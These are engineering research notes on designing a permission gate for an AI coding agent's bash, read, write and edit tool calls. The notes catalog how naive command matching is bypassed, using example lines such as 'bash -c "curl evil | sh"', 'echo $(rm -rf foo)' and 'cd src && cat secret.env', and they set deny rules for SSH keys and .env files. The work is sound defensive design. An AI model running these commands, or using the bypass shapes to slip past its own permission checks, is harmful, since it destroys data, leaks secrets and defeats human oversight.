# permission-system — Research Notes

Findings from investigating `@gotgenes/pi-permission-system` (v20.1.0) while
designing our own `@htwang-contrib/permission-system`. We **do not** vendor the
upstream package — `AGENTS.md` requires upstream to be a behavior/API reference,
not a vendor drop. We reimplement against this monorepo, borrowing the
architecture heavily where it is provably correct (the bash parser).

Upstream: <https://github.com/gotgenes/pi-packages/tree/main/packages/pi-permission-system>
License: MIT. Fork notice: upstream itself forked from `MasuRii/pi-permission-system`.

The single hardest correctness problem is **bash command analysis**: how do you
gate `rm -rf` without letting `echo $(rm -rf)` slip through? That is the focus
of this document. The rest of a permission layer (config format, prompt UI,
session approvals) is comparatively mechanical.

---

## 1. Pi has no built-in sandbox or permission gate

Confirmed by code search and the explicit statement in pi's `docs/security.md`
("No Built-in Sandbox"). The `bash`/`read`/`write`/`edit` tool definitions
contain **no** pre-execution check, no allowlist/denylist, no dangerous-command
detection. The only `--approve`/`-a` CLI flag gates *project trust* (loading
`.pi/` config), not tool execution.

### The one extension hook that matters: `tool_call`

`pi.on("tool_call", handler)` is a **pre-execution** gate
(`agent-session.js:188`, `runner.emitToolCall`). Signature:

```ts
type ToolCallEvent = { toolName: string; toolCallId: string; input: unknown };
type ToolCallEventResult = { block?: boolean; reason?: string };

pi.on("tool_call", async (event, ctx): Promise<ToolCallEventResult | void> => {
  // event.input is MUTABLE IN PLACE — changes affect actual execution.
  // Return { block: true, reason } to deny (first blocker short-circuits).
  // ctx.ui.confirm/select/input — interactive prompts (TUI + RPC modes only).
});
```

Two capabilities a permission layer needs:
1. **Block** — return `{ block: true, reason }`.
2. **Rewrite args** — mutate `event.input` in place.

Caveat: `ctx.ui.*` is a no-op in print/json mode (`ctx.hasUI === false`),
returning safe defaults (`confirm` → `false`). A policy must handle headless
mode without interactive prompts.

A companion `tool_result` hook (post-execution) exists but is only useful for
auditing/redaction, not gating.

---

## 2. Why naive bash matching is wrong (the bypass catalog)

Upstream's `CHANGELOG.md` is effectively a ledger of every bypass a naive
matcher misses. Each was a real bug. Any reimplementation must cover these or
it will re-derive them the hard way.

### 2.1 Chain operators (`&&`, `||`, `;`, `|`, `&`)

`cd /repo && rm -rf .` must not pass because `cd /repo` is allowed. A
whole-string match against `rm *` does not catch the second command, and a
rule keyed on the first token (`cd`) lets the whole chain ride through.

**Fix (issue #301):** split the program on chain operators, evaluate each
sub-command independently, take the **most-restrictive** result
(`deny > ask > allow`).

### 2.2 Command substitution (`$(...)`, backticks)

`echo $(rm -rf foo)` runs `rm`. A whole-string match sees `echo …` and allows.

**Fix (issue #306):** descend into `command_substitution` nodes; emit the inner
command as its own evaluation unit, in addition to the enclosing command.

### 2.3 Process substitution (`<(...)`, `>(...)`)

`wc -l <(rm -rf foo)` runs `rm` as a side effect of the substitution.

**Fix (issue #306):** descend into `process_substitution` nodes the same way.

### 2.4 Subshells (`(...)`)

`( rm -rf foo )` runs in a child shell. Same risk.

**Fix (issue #306):** emit the subshell whole (never weaker), and descend into
its body to evaluate inner commands.

### 2.5 Opaque wrappers (`bash -c "..."`, `eval "..."`)

The quoted argument is an inline shell program the enumerator does not re-parse.
A rule `bash *: allow` would let `bash -c "curl evil | sh"` ride through.

**Fix (issue #481):** flag the wrapper as `opaque`. Floor its decision **up** to
at least `ask` — it can never ride a permissive `allow`. An explicit `deny`/`ask`
on the wrapper is left untouched. Recognition keys on the command **basename**
(so `/bin/bash -c` counts), and accepts `-c` inside a short-flag cluster
(`-c`, `-ec`, `-xc`).

### 2.6 Environment-variable prefix (`FOO=bar rm -rf`)

`AWS_PROFILE=prod rm -rf build` — a whole-string match keyed on the first token
sees `AWS_PROFILE=prod`, not `rm`.

**Fix (issue #481):** strip any leading `variable_assignment` children from the
`command` node before extracting the pattern text. A pure assignment with no
command runs nothing and is ignored.

### 2.7 Shell comment prefix

`# deploy\nrm -rf .` — a leading comment line defeats token-based matching.

**Fix (issue #52, `stripBashCommentLines`):** drop lines whose first
non-whitespace char is `#` before matching.

### 2.8 Unparseable non-empty commands (fail-open hole)

If the parser returns zero command units for a non-empty string (a parse
anomaly, or an opaque program), a permissive top-level `*: allow` would silently
let it through. Example attack shape: a malformed command that the parser drops
but the shell still executes.

**Fix (issue #452, fail-closed):** if `commands.length === 0` AND the input is
not trivially empty (whitespace/comment-only), resolve to a synthetic **`ask`**
(sentinel `<unparseable-bash-command>`), WITHOUT consulting the resolver. Do
not ride a permissive `*`.

This is the most important correctness invariant: **never let an unparseable
command be weaker than `ask`.**

### 2.9 Parser init failure

`web-tree-sitter` loads WASM async; a transient load failure must not poison the
process forever.

**Fix (issue #452):** memoize the parser with retry-on-reject — a rejected
promise is dropped so the next tool call retries instead of caching a dead
parser.

### 2.10 Gate-internal exceptions

If any gate throws, the tool must NOT run ungated.

**Fix (issue #452):** catch at the gate boundary, block with a `gate_error`
review-log entry. Fail closed.

### 2.11 `cd`-aware path resolution

`cd src && cat secret.env` — the path argument resolves relative to `src`, not
cwd. Without `cd`-awareness, a path rule keyed on the cwd-relative form misses.

Two sub-cases:
- **Literal `cd`** (`cd src && ...`): fold the target into the effective working
  directory; resolve subsequent path tokens against it (issue #307).
- **Dynamic `cd`** (`cd "$DIR" && ...`): the target is unknown. Keep only the
  token's literal value — do NOT fabricate an absolute path that could match an
  allowlist it should not (issue #393).

### 2.12 Symlink aliases

A path rule on `/etc/secrets` is bypassed by `/etc/symlink-to-secrets` if only
the lexical form is matched.

**Fix:** match both the lexical (as-typed) AND canonical (symlink-resolved)
forms. `AccessPath` value object holds both behind distinct accessors.

### 2.13 Bare filenames (`ls id_rsa`)

`id_rsa` has no path shape (no `/`, no `..`, no leading `.`/`~`). A naive
classifier drops it. But a `path` rule specifically denying `id_rsa` should fire.

**Fix (issue #509):** "rule-driven promotion". A bare token is promoted into the
path-candidate set ONLY when it matches an active, specific (non-`*`) `path`
deny/ask rule. Never treat every bare argument as a path (most args are branch
names, search patterns, subcommands).

### 2.14 Token rejection heuristics (false positives)

`grep -rn '\.\*' src` — the `'\.\*'` argument looks like a path to a naive
matcher. So do URLs, env assignments, `@scope` packages, flags, bare `/`.

**Fix (`rejectNonPathToken`):** reject flags (`-x`), env assignments
(`FOO=/bar` — `=` before any `/`), URLs (`scheme://`), `@scope/package`,
bare-slash tokens (`/`, `//`), and tokens containing regex metacharacter
sequences (`.*`, `\(`, `[...]`, `^/`).

### 2.15 Cross-platform path shapes

- Windows drive letters (`C:\`, `C:/`) — recognized on all platforms for shape;
  resolution is platform-sensitive (POSIX treats `C:` as a relative filename).
- MSYS drive mounts (`/c/...` on win32 Git Bash).
- Backslash-relative paths (`dir\file`) on win32 only — on POSIX `\` is a legal
  filename char, NOT a separator. The classifier derives the flag from the
  `PathNormalizer`, never reads `process.platform` directly.

These matter less for our NixOS+macOS targets, but the design must not assume
POSIX-only.

---

## 3. Upstream's bash architecture (the reference to borrow)

This is the proven-correct spine. We reimplement it; we do not need to redesign
it.

### 3.1 Parser: `web-tree-sitter` + `tree-sitter-bash.wasm`

`src/access-intent/bash/parser.ts`. This is the **non-negotiable** foundation.
String splitting and regex matching are structurally incapable of handling
quotes, escapes, nesting, and the substitution/subshell cases above. Only a real
AST respects them.

```ts
const { Parser, Language } = await import("web-tree-sitter");
await Parser.init({ locateFile: () => wasmPath });
const parser = new Parser();
parser.setLanguage(await Language.load(bashWasmPath));
const tree = parser.parse(command);  // tree.rootNode, tree.delete()
```

The parser is memoized with retry-on-reject (WASM load is the expensive step;
do it once per process).

### 3.2 Command enumeration: `collectCommands(node)`

`src/access-intent/bash/command-enumeration.ts`. Walks the AST and produces
`BashCommand[]` in source order. The rules of the walk:

| Node type | Action |
| --- | --- |
| `program`, `list`, `pipeline`, `redirected_statement` | descend into children |
| `command` | **emit** (after stripping env-assignment prefix); then descend its subtree to also emit substitution commands |
| `subshell` | **emit whole** (never weaker) + descend body |
| `command_substitution`, `process_substitution` | descend, tag inner commands with `context` |
| `file_redirect`, `heredoc_redirect`, `herestring_redirect`, `comment`, `heredoc_body`, `heredoc_end` | **skip** (not a command) |
| anonymous tokens (`&&`, `;`, `|`, `$(`, `` ` ``, `(`) | skip via `isNamed` guard |
| `compound_statement` (`{ ... }`), `if`/`while`/`for`/`case`, `function_definition` | emit whole, do NOT descend (deferred — bodies run conditionally) |

Two subtle points:
- **Env-prefix stripping**: the emitted text starts at the first non-`variable_assignment` child, sliced verbatim to preserve spacing.
- **Opaque detection**: a `command` whose name (by basename) is `bash`/`sh`/`dash`/`zsh`/`ksh` with a `-c` short flag, OR is `eval`, gets `opaque: true`.

### 3.3 Decision: `resolveBashCommandCheck` (most-restrictive-wins)

`src/handlers/gates/bash-command.ts`. Pure and synchronous (the async parse
happens once upstream, in the handler):

1. `commands.length === 0` → if trivially empty (whitespace/comment-only),
   resolve the whole string normally; else **synthetic `ask`** (fail-closed).
2. Map each command unit through the resolver; for `opaque` units, floor an
   `allow` up to `ask` (sentinel `<opaque-bash-wrapper>`); tag the result with
   the unit's `context` if nested.
3. Return `pickMostRestrictive(results)` (`deny > ask > allow`).

The selected result carries the **offending sub-command** (not the whole chain)
in `command`/`matchedPattern`/`commandContext`, so the prompt and the
session-approval suggestion scope to exactly the command that triggered.

### 3.4 The totality property (why this is safe)

The whole design reduces to one invariant, which upstream pins with a
metamorphic test (`bash-command-metamorphic.test.ts`):

> Wrapping any `ask`/`deny` command in `cd /x && <cmd>` must NOT weaken the
> decision.

Because: chain decomposition splits the prefix off, nested contexts are emitted
in addition to (never instead of) the enclosing command, unparseable inputs
fail closed, and `deny > ask > allow` picks the worst. A `cd` prefix can only
ever make a decision more restrictive, never weaker.

---

## 4. Pattern matching semantics (OpenCode-style wildcards)

`src/wildcard-matcher.ts`. NOT glob. Compiled to regex once:

- `*` → `.*` (any sequence, including empty)
- `?` → `.` (one char)
- the rest is regex-escaped
- `s` flag (dotall) so `*` spans newlines
- **last-match-wins** (`findLast`) — put broad catch-alls first, specific
  overrides after
- Trailing ` *` (space + star) becomes `( .*)?` — so `git *` matches both
  `git push origin main` and bare `git`

Home expansion (`~/`) is applied to the pattern before compilation. Windows
options: `caseInsensitive` (`i` flag), `windowsSeparators` (`/` → `\`).

### The arity table is NOT part of matching

`src/bash-arity.ts` maps command prefixes to token counts (`git: 2`, `npm run:
3`, `rm: 1`, ...). It is used ONLY by the **session-approval suggestion** — when
the user approves `git push origin main` once, how much to remember for the rest
of the session (`git push`, not the whole string). Matching itself uses the
tree-sitter parse + wildcard regex. Do not conflate the two.

---

## 5. The four-layer gate composition

Most-restrictive-wins across layers (an `allow` on one layer cannot override a
`deny` on a more restrictive layer):

```
path (cross-cutting, all tools + bash)
  → external_directory (CWD boundary)
    → per-tool patterns (read/write/edit/bash/...)
      → bash command patterns
```

The `path` surface is special: it applies to **every** tool that touches a path
(Pi tools, bash args, MCP `arguments.path`, extension tools via registered
extractors), and a `path` deny **cannot be overridden** by a per-tool allow. This
is where you protect `.env`, `~/.ssh/*`, etc. once and have it hold everywhere.

---

## 6. Config approach — keep upstream's file-based policy, do NOT use ConfigItem

Upstream reads `~/.pi/agent/extensions/pi-permission-system/config.json` (global)
and `<cwd>/.pi/extensions/pi-permission-system/config.json` (project), validated
by a zod schema, project overriding global. This is the right call for our
reimplementation too:

- The policy is a **nested decision structure** (per-tool maps, path maps, bash
  maps, external_directory maps, runtime knobs) — not a flat set of toggles.
  Forcing it into ConfigItem's select/number/string/boolean items would be a
  lossy, awkward encoding.
- It is written rarely (per-project policy), not toggled at runtime. ConfigItem
  is optimized for runtime `/config` UI edits.
- A JSON file with a `$schema` gives editor autocomplete; ConfigItem gives a
  modal picker. For a policy this complex, the file wins.

**This is an intentional exception** to the repo convention "prefer ConfigItem
over a new config surface". The convention fits simple settings; a permission
policy is not a simple setting.

### The zod schema is the single source of truth

Upstream generates `schemas/permissions.schema.json` FROM the zod schema
(`scripts/generate-permissions-schema.ts`), and the `$schema` URL in the example
config points at it. One definition, two consumers (runtime validation + editor
autocomplete). We should do the same — but note `zod` is not currently a
dependency anywhere in this monorepo; it would be a new runtime dep for this
package.

---

## 7. What does NOT carry over from upstream

### 7.1 `@gotgenes/pi-subagents` integration is dead code for us

Upstream hardcodes integration with `@gotgenes/pi-subagents`:
- `subagent-registry.ts` uses `Symbol.for("@gotgenes/pi-permission-system:subagent-registry")`.
- `subagent-lifecycle-events.ts` subscribes to events
  `subagents:child:session-created` / `subagents:child:disposed` published by
  `@gotgenes/pi-subagents`.
- `forwarding-manager.ts` + the entire `authority/` subdirectory forward `ask`
  prompts from non-UI child sessions up to the parent's UI.

**Our** subagents package is `@htwang-contrib/subagents`, and it does **not**
emit those events (confirmed by search). So all of upstream's subagent
forwarding is inert here. Options for our reimplementation:
- **Omit it entirely** for v1 — subagents just get the local (non-forwarding)
  authorizer, so in a headless child `ask` resolves to the safe default (deny).
  Simplest and correct-by-default.
- Add the forwarding later if/when we teach our subagents package to publish a
  child lifecycle.

Recommend omitting for v1. The `authority/` spine (~15 files) is the single
largest chunk of upstream complexity, and it exists almost entirely to serve
subagent prompt forwarding.

### 7.2 The `catalog:` and pnpm-specific config

Upstream uses pnpm with `pnpm-workspace.yaml` `catalog:` for shared dep versions.
We use npm workspaces. Package.json `devDependencies` using `"catalog:"` must be
rewritten to concrete versions or `*` (our convention for workspace deps).

### 7.3 The 376-file docs tree

Upstream commits per-issue `docs/plans/` and `docs/retro/` files (one per issue
over the project's lifetime) plus architecture phase histories. These are
development process artifacts. They do not belong in our repo. We keep only the
user-facing docs (configuration reference, troubleshooting, recipes) and write
our own.

---

## 8. Dependency footprint for our package

New runtime deps this package introduces (none currently in the monorepo):

| dep | version | why | size note |
| --- | --- | --- | --- |
| `web-tree-sitter` | `^0.26.x` | WASM parser runtime | ships `.wasm` (~1MB) |
| `tree-sitter-bash` | `^0.25.x` | the bash grammar (`.wasm`) | ships `.wasm` (~300KB) |
| `zod` | `^4.x` | config schema + JSON schema gen | ~50KB |

Per repo rules, runtime imports MUST be in `dependencies` (not `devDependencies`)
because `pi install` runs `npm install --omit=dev`. The `web-tree-sitter`/`tree-sitter-bash`
wasm files must resolve via `require.resolve(...)` at runtime — verify the
package `files` arrays include the `.wasm` (they do upstream).

`@earendil-works/pi-coding-agent` and `@earendil-works/pi-tui` stay as
`devDependencies` (provided by the pi host at runtime).

---

## 9. Reference file map (upstream paths to borrow from)

When reimplementing, these are the files to study closely. Paths are relative to
`packages/pi-permission-system/` in the upstream repo.

### The bash spine (copy the architecture, not the code verbatim)
- `src/access-intent/bash/parser.ts` — tree-sitter init + memoize-with-retry
- `src/access-intent/bash/command-enumeration.ts` — the AST walk (§3.2)
- `src/handlers/gates/bash-command.ts` — most-restrictive-wins + fail-closed (§3.3)
- `src/wildcard-matcher.ts` — OpenCode-style wildcard→regex (§4)
- `src/bash-arity.ts` — session-approval prefix suggestion (NOT matching)

### Path analysis
- `src/access-intent/bash/token-classification.ts` — the 3 classifiers + reject
  heuristics (§2.14)
- `src/access-intent/bash/bash-path-resolver.ts` — cd-aware token resolution
- `src/access-intent/access-path.ts` + `path-normalization.ts` — lexical vs
  canonical (symlink) forms

### Tests to mirror
- `test/handlers/gates/bash-command-metamorphic.test.ts` — the totality property
- `test/handlers/gates/bash-command.test.ts` — per-case bypass coverage
- `test/access-intent/bash/*.test.ts` — parser/enumeration unit tests

### Skip for v1
- `src/authority/**` (~15 files) — subagent prompt forwarding (§7.1)
- `src/subagent-*.ts`, `src/forwarding-*.ts` — same
- `docs/plans/**`, `docs/retro/**`, `docs/architecture/history/**` — process
  artifacts (§7.3)

---

## 10. Design decisions (locked)

Decided 2026-07-09. These shape v1 scope and defaults.

### D1 — v1 surfaces: bash + path + tool

Implement the **bash** gate, the cross-cutting **path** gate, and per-tool
(**tool**) gate. This covers the four built-in file/exec tools
(`read`/`write`/`edit`/`bash`) — the attack surface that motivated this work.

**Not in v1:** MCP server/tool gates and skill-name gates. The architecture is
identical, so they can be added later without redesign. We do not use MCP or
skills heavily enough to justify their weight in v1.

### D2 — default policy: dev-friendly

Not the upstream `*: ask` (too noisy for a local dev machine). Defaults:

| Surface | Default | Notes |
| --- | --- | --- |
| `read` | `allow` | reads are low-risk on a dev box |
| `write`, `edit` | `ask` | mutations deserve a prompt |
| `bash` | `ask` | exec is the main risk |
| `path` (cross-cutting) | `*.env` → deny, `~/.ssh/*` → deny, else `allow` | protects secrets once, holds across all tools |
| `external_directory` | `ask` for anything outside cwd | guards against stray writes outside the project |

A user with no config file at all gets these defaults baked in (so the
extension is useful on first install). A config file overrides them.

### D3 — config: independent JSON file (NOT ConfigItem)

A nested permission policy cannot fit ConfigItem's select/number/string/boolean
units (see §6). Decision: a standalone JSON file, validated by a zod schema
that is also the source of the generated `$schema` for editor autocomplete.

Location, using pi's exported path helpers (verified):
- **Global**: `getAgentDir()` → `~/.pi/agent/extensions/permission-system/config.json`
  (overridable via `PI_CODING_AGENT_DIR` env var, which `getAgentDir` honors)
- **Project**: `<cwd>/.pi/extensions/permission-system/config.json`
- Project overrides global (deep-merge, project wins on conflict).

`getAgentDir()` returns `join(homedir(), CONFIG_DIR_NAME, "agent")` where
`CONFIG_DIR_NAME` is `.pi` (from `package.json#piConfig.configDir`). This is the
same mechanism `protect-secrets` uses, so users have one consistent place for
extension policy.

### D4 — coexistence: disable protect-secrets, gondolin unloaded

`protect-secrets` and `gondolin-sandbox` both already hook `tool_call`. Rather
than reason about handler ordering and double-prompts, the decision is:

- **`protect-secrets` will be disabled** (removed from the active
  `pi.extensions` list) once `permission-system` ships — the `path` gate's
  `~/.ssh/*` / `*.env` denies subsume what `protect-secrets` did for agenix
  paths, and the tool gate covers the rest. `permission-system` becomes the
  single `tool_call` authority.
- **`gondolin-sandbox` is not loaded today** (not in `pi.extensions`), so there
  is no live coexistence problem with it. If it is ever enabled later, it wraps
  the tools themselves (rewires `bash`/`read`/`write`/`edit` to a VM) and runs
  *under* the permission gate — the gate still fires first on the host-side
  `tool_call` event, so the two compose without conflict.

Net: v1 does **not** implement multi-handler arbitration. It assumes it is the
sole `tool_call` gatekeeper.
